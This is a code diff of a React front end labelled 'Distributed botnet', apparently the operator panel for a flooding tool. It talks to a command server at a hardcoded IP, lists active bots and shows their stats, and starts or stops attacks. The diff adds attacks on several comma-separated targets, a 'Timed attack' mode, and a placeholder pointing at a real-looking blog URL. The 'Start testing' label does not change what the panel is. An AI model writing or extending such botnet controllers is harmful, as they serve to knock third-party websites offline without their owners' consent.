@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useReducer, useLayoutEffect } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import axios from "axios";
 import {
@@ -8,7 +8,6 @@ import {
   YAxis,
   CartesianGrid,
   Tooltip,
-  Legend,
   ResponsiveContainer,
 } from "recharts";
 import {
@@ -19,8 +18,9 @@ import {
   Button,
   Input,
   Code,
-  IconButton,
-  Icon,
+  Textarea,
+  cx,
+  Radio,
 } from "@vechaiui/react";
 
 const Panel = () => {
@@ -29,6 +29,7 @@ const Panel = () => {
   const serverUrl = "http://54.211.202.150:5000";
 
   const [time, setTime] = useState(0);
+  const [type, setType] = useState(1);
   const [requestsNum, setRequestsNum] = useState(100);
   const [active, setActive] = useState(false);
   const [running, setRunning] = useState(false);
@@ -186,10 +187,15 @@ const Panel = () => {
       intervalTimer = setInterval(() => {
         setTime((prevTime) => prevTime + 10);
       }, 10);
+
       intervalActivity = setInterval(() => {
         getActiveBots(serverUrl);
         getBotsStats(serverUrl, responses);
       }, 10000);
+
+      if (type == 2 && time > requestsNum) {
+        stopBotnet(serverUrl);
+      }
     } else if (!running) {
       clearInterval(intervalTimer);
       clearInterval(intervalActivity);
@@ -219,7 +225,7 @@ const Panel = () => {
             <h1 className="text-3xl font-bold text-gray-700">
               Distributed botnet
             </h1>
-            <p className="text-gray-400 mb-8">version 1.0.3</p>
+            <p className="text-gray-400 mb-8">version 2.0.0</p>
           </div>
           <Button className="mt-2" onClick={logout}>
             Exit
@@ -228,21 +234,44 @@ const Panel = () => {
         <div style={{ height: "75vh" }} className="w-full flex">
           <div className="flex flex-col w-1/2">
             <div style={{ height: "40%" }} className="mb-5">
-              <p className="text-gray-500 text-base mb-3">Give the target:</p>
+              <p className="text-gray-500 text-base mb-3">
+                Give the targets (separate with comma):
+              </p>
               <div className="w-5/6">
-                <Input.Group>
-                  <Input.LeftAddon children="https://" />
-                  <Input
-                    placeholder="target"
-                    onChange={(e) => {
-                      setTarget(e.target.value);
-                    }}
-                  />
-                </Input.Group>
+                <Textarea
+                  onChange={(e) => {
+                    setTarget(e.target.value);
+                  }}
+                  placeholder="http://indrekis2.blogspot.com/"
+                />
               </div>
-              <div className="flex gap-5 mt-5 mb-3 w-5/6 ">
+              <div className="flex items-center gap-5 w-5/6 mt-3 ">
+                <p className="text-sm font-bold text-gray-800  mr-2">
+                  Choose mode:
+                </p>
+                <Radio
+                  name="basic"
+                  defaultChecked
+                  onChange={() => {
+                    setType(1);
+                  }}
+                >
+                  Requests amount
+                </Radio>
+                <Radio
+                  name="basic"
+                  onChange={() => {
+                    setType(2);
+                  }}
+                >
+                  Timed attack
+                </Radio>
+              </div>
+              <div className="flex gap-5 mt-3 mb-3 items-center ">
                 <FormControl id="email" className=" flex flex-col ">
-                  <FormLabel>Amount of requests</FormLabel>
+                  <FormLabel>
+                    {type == 1 ? "Requests amount" : "Amount of time (min)"}
+                  </FormLabel>
                   <Input
                     placeholder="100"
                     onChange={(e) => {
@@ -251,7 +280,7 @@ const Panel = () => {
                     required
                   />
                 </FormControl>
-                <FormControl className="flex flex-col">
+                <FormControl className="flex flex-col ">
                   <FormLabel htmlFor="server-active" className="mb-0 mr-2">
                     Set server active
                   </FormLabel>
@@ -262,11 +291,9 @@ const Panel = () => {
                     onChange={() => changeServerStatus(serverUrl, !active)}
                   />
                 </FormControl>
-              </div>
-              <div className="w-5/6 flex gap-2 justify-end">
                 <Button
                   onClick={() => {
-                    changeTarget(serverUrl, "https://" + target);
+                    changeTarget(serverUrl, target);
                   }}
                 >
                   Change target
@@ -277,6 +304,7 @@ const Panel = () => {
                   }}
                   variant="solid"
                   color="primary"
+                  disabled={running}
                 >
                   Start testing
                 </Button>
